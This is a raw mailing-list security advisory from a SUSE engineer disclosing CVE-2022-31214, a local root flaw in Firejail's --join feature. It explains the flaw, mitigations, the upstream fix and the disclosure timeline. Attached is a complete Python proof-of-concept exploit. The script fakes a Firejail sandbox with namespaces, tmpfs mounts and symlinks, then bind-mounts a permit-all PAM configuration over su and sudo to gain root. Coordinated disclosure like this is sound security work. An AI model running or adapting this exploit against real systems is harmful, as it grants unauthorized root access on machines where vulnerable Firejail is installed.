Received: (qmail 16246 invoked by uid 550); 8 Jun 2022 12:48:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 16213 invoked from network); 8 Jun 2022 12:48:59 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1654692527; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=JJ/6UqDqT+mfF0zh9YbFG5KkhgkyeE/+to7OtFIkhZ8=;
	b=eoyotZL/qwL0Iz8ZfSrMlBK3i5pzFhNI16lz+9ifcNSy0DAMa7khrtobvU7PRiqFDkJyFC
	7zEQRY4g27xlurgBxHOC07ttJllQBXB01jBJEzZi4GHCudUmhI10+pOyse53LR3Iw8oi4F
	Q4iQtB35gJ6YZFdXC9B5STupBIoWoHk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1654692527;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=JJ/6UqDqT+mfF0zh9YbFG5KkhgkyeE/+to7OtFIkhZ8=;
	b=MrcCSa8fFT39mH6dpBBQoa+JP9zZA9b831C2bOXkXEOX5TQeMyuOFTeToy0jJUR/0dL21G
	SW+c4RvZvy/+T4DA==
Date: Wed, 8 Jun 2022 14:48:47 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <YqCar9IFTyPnq2o0@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="x448sf01IhGLI4pe"
Content-Disposition: inline
Subject: [oss-security] firejail: local root exploit reachable via --join logic
 (CVE-2022-31214)

--x448sf01IhGLI4pe
Content-Type: multipart/mixed; boundary="INrw5uUNw3hULG57"
Content-Disposition: inline


--INrw5uUNw3hULG57
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

the following report describes a local root exploit vulnerability in
Firejail [1] version 0.9.68 (and likely various older versions). Any
source code references in this report are based on the 0.9.68 version
tag in the upstream Git repository.

Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Firejail is a setuid-root command line program that allows to execute
programs in isolated sandboxes. The details of execution are controlled
by configuration files and command line switches. The isolation features
are implemented based on Linux namespace mechanisms.

Among the many features of Firejail there exists the possibility to join
an existing Firejail container setup using the `firejail --join=3D<pid>`
style invocation. This join feature is the attack vector for the
vulnerability described in this report.

Join Logic
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Most of the logic behind the join feature is found in the source code
file `src/firejail/join.c`. Critical sections of code are running with
elevated privileges (effective UID 0). The process ID passed as command
line argument is inspected to determine whether it is a Firejail
container and to determine certain of its properties that will be
applied likewise to the newly joining process.

The main criterion for deciding whether joining the target process
succeeds is the presence of a file in the mount namespace of the target
process found at /run/firejail/mnt/join. This check is performed in the
`is_ready_for_join()` function. The file is opened using
`O_RDONLY|O_CLOEXEC` flags and the follow-up `fstat()` result needs to
fulfil the following requirements:

- the file needs to be a regular file.
- the file needs to be owned by user ID 0 (as seen from the initial user
  namespace).
- the file needs to have a size of 1 byte.

Then in a follow-up `read()` call the first byte of the file needs to
equal the ASCII '1' character (`SANDBOX_DONE` preprocessor define in the
source).

If this check succeeds then the various namespaces the target process is
in will be joined and further preparations are made to containerise the
newly joining process.

The Vulnerability
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

An unprivileged user in the system can fake a legit Firejail process by
providing a symlink at /run/firejail/mnt/join that points to a file that
fulfils the requirements listed in the previous section. By creating a
custom user and mount namespace the attacker can create an environment
of its own where mounting tmpfs file systems in arbitrary locations is
possible. Thus /run/firejail can be made writeable within the separate
mount namespace. Since the `open()` call in `join.c:335` follows
symlinks, the target file can reside anywhere else within the accessible
file system tree. Using bind mounting a suitable "join" file could also
be placed there without using symlinks, though.

A file owned by root that contains a '1' character is not that unlikely
to exist somewhere on the system. If the attacker has local system
access and automounting of removable storage devices is available then
attaching a storage device that contains such a file could also be an
option. Even simpler, however, is using Firejail itself to provide the
file. Creating a Firejail instance without security profiles applied
(switch `--noprofile`) will make its "join" file accessible also from
within the initial mount namespace in the system via its
/proc/<pid>/root entry.

Once a suitable file is staged in a fake Firejail instance, the fake
Firejail process will be basically accepted by Firejail for joining it.
Firejail by default sets the `NO_NEW_PRIVS` `prctl()` for sandboxed
processes. When using `firejail --noprofile` or when faking a Firejail
instance, the setting will not be applied, however. Firejail's join
logic is trusting the target process, and copies this property from it.
Next Firejail will join the target process's namespaces (`join.c:441`),
particularly interesting for this attack, the mount namespace. Then,
after forking a new child process for the join operation, the logic
attempts to drop privileges by joining the target user namespace
(`join.c:497`).

For joining the user namespace not the target process is used but the
init process with PID 1. The consideration behind this is probably that
it is always expected that the Firejail container is running in its own
PID namespace and the init process inside it can be trusted for having
the correct user namespace assigned. In this attack scenario there is no
separate PID namespace, so the initial PID namespace will still be
visible in /proc. Regardless of this the attacker controlled mount
namespace (of which the joining Firejail process already is a member of
by now) can blend in a tmpfs in /proc/1, thereby controlling which user
namespace the Firejail join operation will actually join.

Joining an actual separate user namespace is not what is desired for
this attack (although this could also be interesting for joining
arbitrary other users' containers and sandboxes). The aim of this attack
is not to join any user namespace at all. Attempting to join the initial
user namespace will fail, because joining the current user namespace
again is denied by the kernel. To avoid this, a symlink can be placed in
/proc/1/ns/user that points to an arbitrary different namespace object.
In this example the symlink will point to the *time* namespace of the
current process. Joining the time namespace will succeed and Firejail
will not detect an error.

The resulting "joined" shell will now live in the initial user
namespace, holding still the original normal user privileges, however
the mount namespace will be the one controlled by the attacker. Since
the nonewprivs setting has not been applied, the attacker is now able to
run setuid-root programs within this mount namespace. From here on all
that needs to be done is changing file system contents in a way that
typical setuid-root binaries like `su` or `sudo` will grant full root
privileges. The attached proof of concept exploit I wrote for this
vulnerability does this by replacing the PAM stack configuration.

Workarounds / Mitigations
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

System administrators can mitigate this vulnerability via the Firejail
configuration file in /etc/firejail/firejail.config. Either one of these
options will prevent the attack from succeeding:

- "force-nonewprivs yes"
- "join no"

Upstream informed me that in contrast to this the compile time option
"enable-force-nonewprivs" does not neutralize this particular exploit.
This fact is also investigated and possibly patched by upstream in the
future.

Proof of Concept Exploit
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Attached is a proof of concept Python program that has been tested on
current openSUSE, Debian, Arch, Gentoo and Fedora distributions. The
only precondition for the exploit is that Firejail is installed and
accessible to the user. On openSUSE only members of the firejail group
may run firejail, thus the impact is constrained a bit. On Fedora the
attack is hindered a bit by (likely) SELinux rules that prevent a user
from mounting a tmpfs below /proc. The exploit still works by mounting a
tmpfs over all of /proc though.

Upstream Bugfix
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Upstream published a comprehensive bugfix for this issue just today [2].
The following changes make up the core of the bugfix:

- obtaining information about and performing operations on process
  namespaces is now based on `openat()` system calls relative to the
  /proc/<pid> directory of the target process. This mainly avoids race
  conditions.
- it is checked that the target process is actually owned by root and
  not controlled by an unprivileged user.
- the `setns()` system calls now pass the expected `nstype` parameter to
  avoid being tricked into joining a completely different type of
  namespace object.
- as an additional hardening a check is performed whether the mnt
  namespace to be joined is actually owned by the user namespace to be
  joined.

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2022-05-03: I contacted the upstream security contact with the
            vulnerability details and offered coordinated disclosure.
2022-05-13: There have been technical problems reaching the security
            contact by email, by creating a GitHub issue we've been able
	    to get the attention of the upstream developer team and
	    finally to forward the vulnerability details.
2022-05-19: I obtained CVE-2022-31214 from Mitre to track this finding.
2022-05-30: The upstream developers and myself started reviewing the
            first version of the bugfix.
2022-06-08: After multiple iterations all parties agreed on the final
            version of the patch. Upstream published the patch.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://github.com/netblue30/firejail
[2]: https://github.com/netblue30/firejail/commit/27cde3d7d1e4e16d419093234=
7c7151dc2a84c50

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev

--INrw5uUNw3hULG57
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="firejoin.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to=
 the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fa=
ke
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell t=
hat
# lives in an attacker controller mount namespace while the user namespace =
is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] =3D sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for=
 the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s =3D os.stat(f)

    if s.st_uid !=3D 0 or s.st_size !=3D 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch =3D fd.read(2)

        if len(ch) !=3D 1 or ch !=3D "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s =3D os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) =3D=3D 0:
        printe(f"{__file__} needs to have the execute bit set for the explo=
it to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making availab=
le
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc =3D subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=3Dsubprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line =3D proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>"=
 is output
        line =3D line.decode('utf8').strip().lower()
        if line.find("child pid") =3D=3D -1:
            continue

        child_pid =3D line.split()[-1]

        try:
            child_pid =3D int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sand=
box")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children =3D f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line =3D cfd.read().strip()
            kids =3D line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) !=3D 1:
                raise Exception(f"failed to determine sleep child PID from =
helper sandbox: {kids}")

            try:
                sleep_pid =3D int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from h=
elper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence i=
n {children}")

    join_file =3D f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not fo=
und at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (ow=
ner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] =3D join_file
    os.environ["FIREJOIN_UNSHARED"] =3D "1"

    unshare =3D shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline =3D "unshare -U -r -m".split()
    cmdline +=3D [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox =
and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file =3D createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file =3D os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src =3D "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place=
 a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, b=
ut
    # we need to bind-mount a copy of our own time namespace first that we =
can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src =3D "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT =3D Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace t=
hat
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileg=
es,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will oper=
ate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not o=
wned
# by root e.g. /etc/sudoers. There are various directions that could be tak=
en,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service =3D Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join=3D{os.getpid()}' in another termin=
al to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line =3D sys.stdin.readline()
    if not line:
        break

--INrw5uUNw3hULG57--

--x448sf01IhGLI4pe
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmKgmq8ACgkQFMQFyXGS
NVOa4xAA06x22bsgvxqOGHMY3wgJb2b/pBEaVMag+BtX+i583ZjS5vBK1JYdCBxb
SLKtvA/qxd9/VZ6d7OOG8HzSl0jDQXFTBrNymQFU52eHm3Lt7XGAKAOVNortpnwO
jOBb7hsXaZHGFbrNju9dBDdAMHDEMYUbl4+NJR+AXtFU264pK0E4FBsoZVgh+rC9
lgWEiwvNPV0tzc+ctWTduLj4ERntQBZjs/DJXTOVb38OnzLqcxOeIV4lXRfwrqEJ
dtSZTI95y//P/dVPwRqi+XerX1+mHsFpGBPsXLWsx6eHrSm88RGmgnOyo4HitySB
q2LSm9/sYlzTRmeN/WvQG7OmMf+yx6D/xtM5ZaRxZDPqhCGUB+8aeB/3typQDxmn
FriIb9ZsMmV0T5XAxHitjN/y5xXizfuXtOPWDCCaCmEpMS85kclRxyqgvwEMZxSC
pWTxHTwKedr0LIa6HW1gAtuvNKDEaextxAniY6iuYMn/ahNDkw/RuivHSfsNqGoc
onrtpaABu/V4WolfC9hSl7dMhwn0UcJVgTDKFx2nBLlUhYhFlodlTxOwTJi2M6+O
KoTe758sToakSd2/KeaxLhv0V8+AD5dYIGLna39shuXuLj2/cn8k8ZJPfrX1TY9z
rvmhz7nzuh59YyUeYDe4dlRUVl9VLJbVGOowaWaU4oJjs6Z4sKc=
=2qUw
-----END PGP SIGNATURE-----

--x448sf01IhGLI4pe--
